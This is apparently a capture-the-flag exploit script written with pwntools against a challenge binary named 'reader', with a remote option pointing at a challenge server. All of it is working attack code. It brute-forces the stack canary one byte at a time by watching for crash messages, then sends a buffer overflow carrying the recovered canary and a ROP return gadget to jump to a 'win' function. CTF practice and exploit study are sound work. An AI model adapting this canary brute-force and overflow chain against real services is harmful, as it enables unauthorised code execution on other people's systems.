from pwn import *

gs = """
b *vuln
continue
"""

elf = ELF("./reader")

def start():
    if args.REMOTE:
        return remote("0.cloud.chals.io", 10677)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)
        
context.terminal = ['gnome-terminal', '-e']

io = start()

canary = bytearray([0x0])

for _ in range(7):
    for i in range(1, 256):
        payload = b"".join([
            b"A"*72,
            canary + bytearray([i])
        ])

        io.sendafter("Enter some data: ", payload)

        io.recvline()

        output = io.recv().decode(errors='ignore')

        if not "stack smashing detected" in output:
            #print(canary + bytearray([i]))
            canary += bytearray([i])
            print(canary)
            io.send("PWNED?")
            break

#io.send("PWNED?")

canary = u64(canary)

print(f"Canary: {hex(canary)}")

rop = ROP(elf)

ret = rop.find_gadget(['ret'])[0]

payload = b"".join([
    b"A"*72,
    p64(canary),
    b"A"*8,
    p64(ret),
    p64(elf.sym.win)
])

io.sendafter("Enter some data: ", payload)

io.interactive()
